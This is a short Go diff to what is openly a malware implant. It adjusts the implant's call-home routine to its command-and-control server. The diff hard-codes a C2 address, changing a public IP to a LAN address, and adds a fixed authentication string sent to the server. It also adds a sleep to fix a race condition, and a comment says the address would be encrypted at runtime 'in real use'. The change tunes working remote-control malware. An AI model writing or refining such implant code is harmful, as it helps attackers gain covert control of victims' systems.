@@ -43,12 +43,14 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 		os.Exit(1)
 	}
 	reply2Auth(&addr)
+	time.Sleep(1 * time.Second) //Attempt to combat race condition
 	*attempts = 0
 	return addr, true
 }
 
 func reply2Auth(conn *net.Conn) {
-	fmt.Println("Sending Auth Message")
+	//fmt.Println("Sending Auth Message")
+	//time.Sleep(2 * time.Second) //Attempt to combat a race condition
 	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
 }
 
@@ -295,7 +297,7 @@ func hostinfo(conn net.Conn) bool {
 }
 
 func main() {
-	c2Address := "89.43.33.169:1234" // Encrypt/decode at runtime in real use
+	c2Address := "192.168.0.102:1234" // Encrypt/decode at runtime in real use
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
